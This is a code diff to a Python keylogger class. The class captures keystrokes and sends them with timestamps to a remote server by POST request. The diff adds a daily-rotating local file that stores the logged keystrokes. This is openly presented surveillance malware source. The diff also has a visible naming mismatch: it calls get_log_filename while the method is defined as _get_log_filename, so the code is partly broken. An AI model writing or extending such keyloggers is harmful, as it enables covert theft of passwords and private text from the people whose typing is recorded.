@@ -16,6 +16,8 @@ class KeyLogger:
         self.text = ""
         self.shift_pressed = False
         self.capslock_on = False
+        self.current_date = datetime.now().date()
+        self.log_filename = self.get_log_filename()
     
         self.shift_map = { 
             '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
@@ -23,7 +25,17 @@ class KeyLogger:
             '`': '~', '-': '_', '=': '+', '[': '{', ']': '}',
             '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?' 
         }
+    def _get_log_filename(self):
+        today = datetime.now().strftime("%Y-%m-%d")
+        return f"keyboard_{today}.txt"
+    
     def _send_post_request(self):
+        now = datetime.now()
+        if now.date() != self.current_date:
+            self.current_date = now.date()
+            self.log_filename = self._get_log_filename()
+
+
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         payload = json.dumps({
             "timestamp": timestamp,
@@ -34,6 +46,8 @@ class KeyLogger:
                           data=payload, 
                           headers={"Content-Type" : "application/json"}
                           )
+            with open(self.log_filename, "a") as f:
+                f.write(f"{timestamp} - {self.text}\n")
         except:
             print("Failed to send log!")
 
